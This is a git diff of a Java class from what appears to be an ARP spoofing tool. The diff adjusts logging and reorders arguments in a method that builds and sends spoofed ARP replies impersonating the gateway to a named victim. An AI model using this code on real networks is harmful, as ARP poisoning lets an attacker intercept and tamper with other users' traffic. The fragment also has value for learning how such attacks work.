@@ -5,14 +5,12 @@ import java.net.InetAddress;
 
 import jpcap.packet.ARPPacket;
 
-import org.apache.log4j.Logger;
 import org.bitducks.spoofing.core.InterfaceInfo;
 import org.bitducks.spoofing.core.Server;
 import org.bitducks.spoofing.core.Service;
 import org.bitducks.spoofing.packet.PacketFactory;
 import org.bitducks.spoofing.util.Constants;
 import org.bitducks.spoofing.util.gateway.GatewayFinder;
-
 
 public class ReplyARPService extends Service {
 	private InterfaceInfo infoInterface;
@@ -26,6 +24,7 @@ public class ReplyARPService extends Service {
 		try {
 			gateway = GatewayFinder.find(infoInterface.getDevice());
 		} catch (IOException e) {
+			logger.error("Gateway can't be found!");
 			e.printStackTrace();
 		}
 	}
@@ -45,7 +44,7 @@ public class ReplyARPService extends Service {
 	}
 	
 	public void replySpoof() {
-		ARPPacket spoofedPacket = PacketFactory.arpReply(infoInterface.getMacAddress(), gateway, victim, Constants.BROADCAST);
+		ARPPacket spoofedPacket = PacketFactory.arpReply(infoInterface.getMacAddress(), gateway, Constants.BROADCAST, victim);
 		logger.info("Sending a spoofed ARP reply to " + victim);
 		Server.getInstance().sendPacket(spoofedPacket);
 	}
